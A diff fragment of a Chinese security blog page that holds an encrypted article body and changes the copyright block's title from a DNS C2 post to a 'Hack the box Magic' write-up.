MPzQDVqLMPTK/elb5IUtthgaBt9UvFqtGupuaJ+TDQJ1AxYJUhMJu7TfZF9dIvpSvkfqgKik3eHUgyGk7KO2gF9MsxJu1Wu8P1uZfxTTvJFlYinTDObCtCQmzoHXWTD6uCqQK4eGnYHK/i/4xuVDfAWy6oW9F2HW0ENuGfqYel9Q8V9aVu7LxiQwh4Zcl+A+F3nr7aGxkRGEGsUawiYRssAtaRAyb7G56Cb1WpDFM3qWVVjUp7x+ysFZcwwG+2N3nPsMtbQ1uGNByuoVDPUBhe5v/7UkEPfvalCjbZN9nJSBMxGQFYVs+bSoWay1UMwXdpAhWYqSiDRZqmvJRTPVKqghPU=
+</div>
+<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -1618,12 +1448,12 @@ dnspython --- 发送dns请求
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>一个很像cxk的dns_c2</p>
+    <p><span class="copy-title">文章标题:</span>Hack the box Magic</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-02, 21:11:11</p>
-    <p><span class="copy-title">最后更新:</span>2019-05-02, 23:14:50</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/126651c2.html" title="一个很像cxk的dns_c2">http://422926799.github.io/posts/126651c2.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-21, 15:44:06</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-21, 16:17:20</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/e8feabea.html" title="Hack the box Magic">http://422926799.github.io/posts/e8feabea.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
